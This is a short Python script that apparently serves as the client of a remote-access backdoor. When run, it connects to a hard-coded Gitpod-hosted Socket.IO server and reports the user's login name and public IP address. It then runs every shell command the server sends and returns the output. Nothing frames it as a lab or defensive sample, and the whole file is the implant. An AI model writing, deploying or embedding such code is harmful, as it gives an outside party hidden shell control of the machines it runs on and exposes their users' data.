import socketio
import public_ip as ip
import json
import getpass
import subprocess

SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
# Connect to the Socket.IO server
sio = socketio.Client()

def execute_command(command):
  return subprocess.check_output(command, shell=True, text=True)

@sio.on('connect')
def on_connect():
  print('Connected to server')
  data = {'client': True, 'username': getpass.getuser(), 'ip': ip.get()} 
  sio.emit('establishment', data)
  

@sio.on('disconnect')
def on_disconnect():
    print('Disconnected from server')

@sio.on('command')
def command(data):
  output = execute_command(data['command'])
  return_data = {'output': output, 'returnAddress': data['returnAddress']}
  sio.emit('commandResponse', return_data)

# Start the connection
sio.connect(SERVER)

# Wait for the connection to establish
sio.wait()
